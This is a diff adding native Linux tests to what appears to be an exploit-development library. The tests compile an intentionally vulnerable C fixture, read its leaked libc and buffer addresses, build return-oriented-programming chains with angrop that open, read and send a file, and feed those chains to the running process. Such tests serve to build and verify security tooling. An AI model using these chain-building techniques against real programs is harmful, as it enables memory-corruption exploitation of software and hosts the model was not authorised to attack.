@@ -8,6 +8,7 @@ to ``execve(2)`` by ``subprocess``.
 
 from __future__ import annotations
 
+import gc
 import os
 import platform
 import select
@@ -22,7 +23,11 @@ from pathlib import Path
 from payloads import (
     FSOP,
     Address,
+    AngropDiscoveryOptions,
+    AngropImageSpec,
     Architecture,
+    ELFProfile,
+    ExactELFAdapter,
     FSOPActivation,
     FSOPFamily,
     FSOPStream,
@@ -32,10 +37,13 @@ from payloads import (
     IOVtableBounds,
     LibcBoundAddress,
     LibcImage,
+    LibcROPBuilder,
+    LibcROPStageKind,
     Linkage,
     PayloadKind,
     RuntimeLayout,
     SemanticGadget,
+    Target,
     ZigAssembler,
     command_shellcode,
     exit_shellcode,
@@ -46,6 +54,7 @@ from payloads import (
 )
 from payloads.rop import build_ret2libc_system
 from payloads.shellcode import sendfile_orw_shellcode
+from payloads.tests.test_glibc_qemu import _X86_ROP_SOURCE, _protocol_header
 from payloads.tests.test_rop_qemu import (
     _RET2LIBC_SOURCE,
     _assemble_static_fixture,
@@ -57,8 +66,17 @@ from payloads.tests.test_shellcode_qemu import _link_raw_payload
 
 _NATIVE_OPT_IN = os.environ.get("PWNC_NATIVE_TESTS") == "1"
 _NATIVE_TARGETS = (resolve_target("x86"), resolve_target("x86_64"))
+_NATIVE_ANGROP_BITS_ENV = "PWNC_NATIVE_ANGROP_BITS"
 _REQUIRED_TOOLS = ("cc", "zig", "llvm-mc", "ld.lld")
 _MISSING_TOOLS = tuple(tool for tool in _REQUIRED_TOOLS if shutil.which(tool) is None)
+_NATIVE_ANGROP_CHAIN_OFFSET = 0x10000
+_NATIVE_ANGROP_ROP_SOURCE = _X86_ROP_SOURCE.replace(
+    "pwnc_chain[0x100000]",
+    "pwnc_chain[0x20000]",
+).replace(
+    "pwnc_chain + 0xf0000",
+    f"pwnc_chain + 0x{_NATIVE_ANGROP_CHAIN_OFFSET:x}",
+)
 _PROBE_SOURCE = r"""
 #define _GNU_SOURCE
 #include <dlfcn.h>
@@ -459,6 +477,278 @@ class NativeStaticRopTests(unittest.TestCase):
 
                 self.assertEqual(syscall_run.returncode, 43, syscall_run.stderr.decode(errors="replace"))
                 self.assertEqual(call_run.returncode, 42, call_run.stderr.decode(errors="replace"))
+
+
+@unittest.skipUnless(
+    _NATIVE_OPT_IN,
+    "set PWNC_NATIVE_TESTS=1 to run direct Linux i386 and AMD64 execution tests",
+)
+class NativeAngropLibcROPTests(unittest.TestCase):
+    """Execute automatic exact-libc chains directly in both host x86 ABIs."""
+
+    @classmethod
+    def setUpClass(cls) -> None:
+        super().setUpClass()
+        if not sys.platform.startswith("linux"):
+            raise AssertionError(f"PWNC_NATIVE_TESTS=1 needs Linux, not {sys.platform!r}")
+        if platform.machine().lower() not in {"amd64", "x86_64"}:
+            raise AssertionError(f"PWNC_NATIVE_TESTS=1 needs an x86_64 host, not {platform.machine()!r}")
+        if shutil.which("cc") is None:
+            raise AssertionError("PWNC_NATIVE_TESTS=1 needs a host C compiler")
+        try:
+            __import__("angr")
+        except ImportError as exc:
+            raise AssertionError("PWNC_NATIVE_TESTS=1 needs the optional pwnc[rop] dependencies") from exc
+
+    def test_real_host_libc_orw_and_sendfile_use_only_exact_main_gadgets(self) -> None:
+        selected_bits = os.environ.get(_NATIVE_ANGROP_BITS_ENV)
+        if selected_bits is None:
+            # angr retains substantial process-global analysis state.  Give
+            # each native ABI a clean process so i386 and AMD64 coverage does
+            # not depend on the host's memory limit or collection timing.
+            worker_test = f"{__name__}.{type(self).__name__}.{self._testMethodName}"
+            for target in _NATIVE_TARGETS:
+                with (
+                    self.subTest(target=target.name),
+                    tempfile.TemporaryDirectory(prefix="pwnc-native-angrop-probe-") as directory,
+                ):
+                    probe = Path(directory, "probe")
+                    compiled = _compile_c(_PROBE_SOURCE, probe, target.bits)
+                    if compiled.returncode:
+                        self.fail(
+                            f"native {target.bits}-bit compiler/libc development files are unavailable: "
+                            f"{compiled.stderr.strip()}"
+                        )
+                    try:
+                        started = subprocess.run(
+                            [str(probe)],
+                            capture_output=True,
+                            timeout=10,
+                            env=_native_environment(),
+                            check=False,
+                        )
+                    except OSError as exc:
+                        self.fail(f"the host kernel cannot execute native {target.bits}-bit x86 ELFs: {exc}")
+                    if started.returncode:
+                        self.fail(
+                            f"native {target.bits}-bit loader/libc probe exited {started.returncode}: "
+                            f"{started.stderr.decode(errors='replace').strip()}"
+                        )
+                    environment = _native_environment()
+                    environment["PWNC_NATIVE_TESTS"] = "1"
+                    environment[_NATIVE_ANGROP_BITS_ENV] = str(target.bits)
+                    worker = subprocess.run(
+                        [
+                            sys.executable,
+                            "-m",
+                            "unittest",
+                            worker_test,
+                            "-v",
+                        ],
+                        capture_output=True,
+                        timeout=120,
+                        env=environment,
+                        check=False,
+                    )
+                    detail = (worker.stdout + worker.stderr).decode(errors="replace")
+                    self.assertEqual(worker.returncode, 0, detail)
+            return
+        try:
+            selected_bits_integer = int(selected_bits)
+        except ValueError as exc:
+            raise AssertionError(f"{_NATIVE_ANGROP_BITS_ENV} must be 32 or 64") from exc
+        if selected_bits_integer not in {32, 64}:
+            raise AssertionError(f"{_NATIVE_ANGROP_BITS_ENV} must be 32 or 64")
+
+        expected = bytes(range(256)) + b"\0PWNC native angrop libc ROP\n"
+        for target in (item for item in _NATIVE_TARGETS if item.bits == selected_bits_integer):
+            with (
+                self.subTest(target=target.name),
+                tempfile.TemporaryDirectory(prefix="pwnc-native-angrop-rop-") as directory,
+            ):
+                root = Path(directory)
+                executable = root / "fixture"
+                compiled = _compile_c(_NATIVE_ANGROP_ROP_SOURCE, executable, target.bits)
+                if compiled.returncode:
+                    self.fail(
+                        f"native {target.bits}-bit compiler/libc development files are unavailable: "
+                        f"{compiled.stderr.strip()}"
+                    )
+                try:
+                    probe = subprocess.run(
+                        [str(executable)],
+                        input=b"",
+                        capture_output=True,
+                        timeout=10,
+                        env=_native_environment(),
+                        check=False,
+                    )
+                except OSError as exc:
+                    self.fail(f"the host kernel cannot execute native {target.bits}-bit x86 ELFs: {exc}")
+                # EOF after the disclosure is expected; this probe only proves
+                # that the host kernel and dynamic loader can start the fixture.
+                self.assertEqual(probe.returncode, 102, probe.stderr.decode(errors="replace"))
+
+                profile = inspect_elf(executable)
+                self.assertEqual(profile.target, target)
+                self.assertFalse(profile.pie)
+                self.assertIs(profile.linkage, Linkage.DYNAMIC)
+                self.assertTrue(profile.nx, profile.nx_evidence)
+                main_adapter = ExactELFAdapter.from_file(executable, expected_target=target)
+                main_image = AngropImageSpec.from_adapter(
+                    main_adapter,
+                    load_bias=0,
+                    name="native challenge",
+                    scan_gadgets=True,
+                )
+                input_file = root / "orw-input"
+                input_file.write_bytes(expected)
+
+                for mode in ("orw", "sendfile"):
+                    with self.subTest(target=target.name, mode=mode):
+                        self._run_real_libc_program(
+                            executable,
+                            profile,
+                            main_image,
+                            target,
+                            input_file,
+                            expected,
+                            mode,
+                        )
+                        # angr's project/analysis graph contains cycles.  Each
+                        # mode deliberately prepares a fresh exact session, so
+                        # collect the now-unreachable graph before the next ABI
+                        # rather than making peak memory depend on GC timing.
+                        gc.collect()
+
+    def _run_real_libc_program(
+        self,
+        executable: Path,
+        profile: ELFProfile,
+        main_image: AngropImageSpec,
+        target: Target,
+        input_file: Path,
+        expected: bytes,
+        mode: str,
+    ) -> None:
+        process = subprocess.Popen(
+            [str(executable)],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            env=_native_environment(),
+        )
+        try:
+            fields = _read_process_line(process).split(b"\t")
+            self.assertEqual(len(fields), 7, fields)
+            self.assertEqual(fields[0], b"PWNC_ROP")
+            libc_path = Path(os.fsdecode(fields[1])).resolve(strict=True)
+            libc_base = int(fields[2], 16)
+            glibc_version = fields[3].decode("ascii")
+            open_address = int(fields[4], 16)
+            chain_base = int(fields[5], 16)
+            storage_address = int(fields[6], 16)
+
+            # These disclosures, not /proc/self/mem or debugger-only state,
+            # are the only runtime facts used to construct the payload.
+            builder = LibcROPBuilder.from_file(
+                libc_path,
+                input_file,
+                writable_area=Address(storage_address, Image.MAIN, "fixture writable storage"),
+                writable_size=0x2000,
+                path_address=Address(storage_address, Image.MAIN, "external ORW path"),
+                target=target,
+            )
+            self.assertRegex(glibc_version, r"^\d+\.\d+$")
+            self.assertEqual(builder.libc.identity.sha256, inspect_elf(libc_path).sha256)
+            self.assertEqual(libc_base + builder.libc.offset("open"), open_address)
+            self.assertEqual(
+                chain_base,
+                profile.symbol_offsets["pwnc_chain"] + _NATIVE_ANGROP_CHAIN_OFFSET + (8 if target.bits == 32 else 0),
+            )
+            self.assertEqual(storage_address, profile.symbol_offsets["pwnc_storage"])
+
+            # /proc maps are verification evidence only; deleting these checks
+            # would not change any address supplied to the payload builder.
+            libc_maps = _artifact_mappings(_read_proc_maps(process), libc_path)
+            self.assertTrue(libc_maps)
+            self.assertEqual({item.start for item in libc_maps if item.offset == 0}, {libc_base})
+            self.assertTrue(any(item.contains(open_address) and "x" in item.permissions for item in libc_maps))
+
+            if mode == "orw":
+                program = builder.compose(
+                    builder.open(),
+                    builder.read(3, len(expected)),
+                    builder.write(1, len(expected)),
+                    builder.exit(42),
+                )
+                expected_operations = (
+                    LibcROPStageKind.OPEN,
+                    LibcROPStageKind.READ,
+                    LibcROPStageKind.WRITE,
+                    LibcROPStageKind.EXIT,
+                )
+                exit_status = 42
+            else:
+                program = builder.compose(
+                    builder.open(),
+                    builder.sendfile(1, 3, len(expected)),
+                    builder.exit(43),
+                )
+                expected_operations = (
+                    LibcROPStageKind.OPEN,
+                    LibcROPStageKind.SENDFILE,
+                    LibcROPStageKind.EXIT,
+                )
+                exit_status = 43
+            self.assertEqual(program.operations, expected_operations)
+            self.assertEqual(len(program.external_placements), 1)
+            path = program.external_placements[0]
+            layout = RuntimeLayout(main_base=0, libc_base=libc_base)
+            self.assertEqual(path.resolved_address(layout), storage_address)
+            self.assertEqual(path.data, os.fsencode(input_file) + b"\0")
+
+            lowered = program.lower(
+                layout,
+                chain_base=chain_base,
+                extra_images=(main_image,),
+                scan_libc_gadgets=False,
+                # The native lane verifies chain execution, while the focused
+                # backend suite exercises ROPBlock optimization.  This fixture
+                # already supplies one direct loader per ABI; graph expansion
+                # adds no coverage and makes four real-angr sessions retain a
+                # needlessly large optimizer graph in one unittest process.
+                options=AngropDiscoveryOptions(processes=1, optimize=False, show_progress=False, timeout=10),
+                timeout=10,
+            )
+            self.assertEqual(lowered.backend, "angrop")
+            self.assertIsNotNone(lowered.backend_result)
+            assert lowered.backend_result is not None
+            provenance = lowered.backend_result
+            self.assertFalse(provenance.discovery_options.optimize)
+            self.assertEqual([item.name for item in provenance.images], ["libc", "native challenge"])
+            self.assertEqual([item.scan_gadgets for item in provenance.images], [False, True])
+            self.assertEqual([item.cle_main for item in provenance.images], [False, True])
+            self.assertTrue(provenance.calls)
+            self.assertTrue(all(item.image_name == "libc" for item in provenance.calls))
+            self.assertTrue(any(item.call_target and item.image_name == "libc" for item in provenance.gadgets))
+            self.assertTrue(
+                any(not item.call_target and item.image_name == "native challenge" for item in provenance.gadgets)
+            )
+            self.assertFalse(any(not item.call_target and item.image_name == "libc" for item in provenance.gadgets))
+            self.assertFalse(lowered.program.inline_path)
+            self.assertIsNone(lowered.inline_path_offset)
+
+            chain_capacity = 0x10000 - (8 if target.bits == 32 else 0)
+            self.assertLessEqual(len(lowered.data), chain_capacity)
+            protocol = _protocol_header(target, len(path.data), len(lowered.data)) + path.data + lowered.data
+            stdout, stderr = process.communicate(protocol, timeout=30)
+            self.assertEqual(process.returncode, exit_status, stderr.decode(errors="replace"))
+            self.assertEqual(stdout, expected)
+        finally:
+            if process.poll() is None:
+                process.kill()
+            process.communicate()
 
 
 @unittest.skipUnless(
